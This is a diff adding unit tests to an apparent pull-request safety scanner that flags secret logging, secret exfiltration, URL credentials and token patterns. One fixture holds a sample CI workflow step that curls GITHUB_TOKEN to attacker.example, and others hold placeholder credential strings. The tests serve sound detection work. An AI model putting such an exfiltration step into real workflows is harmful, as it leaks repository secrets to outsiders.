@@ -91,6 +91,33 @@ test('requires manual review when any console method exposes secrets', () => {
   assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
 });
 
+test('requires manual review when stdout exposes secrets', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: `+process.stdout.write(${secretName});`,
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
+});
+
+test('requires manual review for split-line secret exfiltration', () => {
+  const secretName = 'secrets.' + 'GITHUB_TOKEN';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: [
+      '+env:',
+      `+  STOLEN: \${{ ${secretName} }}`,
+      '+run: |',
+      '+  curl -s https://attacker.example/collect -d "t=$STOLEN"',
+    ].join('\n'),
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_network'));
+});
+
 test('allows trusted authors before scanning risky diff content', () => {
   const secretName = 'secrets.' + 'OPENAI_API_KEY';
   const result = assessPullRequestSafety({
@@ -101,6 +128,17 @@ test('allows trusted authors before scanning risky diff content', () => {
 
   assert.equal(result.decision, 'allow_triage');
   assert.deepEqual(result.reason_codes, []);
+});
+
+test('fails closed for trusted authors when head sha is missing', () => {
+  const result = assessPullRequestSafety({
+    pr: pr({ headRefOid: '' }),
+    diff: '+const copy = "Done";\n',
+    trustedAuthor: true,
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('input:missing_head_sha'));
 });
 
 test('requires manual review for hardcoded secret values', () => {
@@ -131,6 +169,37 @@ test('requires manual review for hardcoded secret values', () => {
   assert.ok(result.reason_codes.includes('secret_value:bearer_token'));
   assert.ok(result.reason_codes.includes('secret_value:access_token_param'));
   assert.ok(result.reason_codes.includes('secret_value:assignment'));
+});
+
+test('requires manual review for URL credentials', () => {
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: '+const db = "postgres://admin:my-very-long-secret-password-1234@db.example.com/app";',
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('secret_value:url_credentials'));
+});
+
+test('requires manual review for quoted Go-style assignments', () => {
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: '+apiKey := `abcdefghijklmnopqrstuvwx`',
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('secret_value:assignment'));
+});
+
+test('requires manual review for fine-grained GitHub PATs', () => {
+  const fineGrainedPat = 'github_pat_' + 'abcdefghijklmnopqrst';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: `+const pat = "${fineGrainedPat}";`,
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('secret_value:github_token'));
 });
 
 test('requires manual review for hardcoded secret values in PR text', () => {
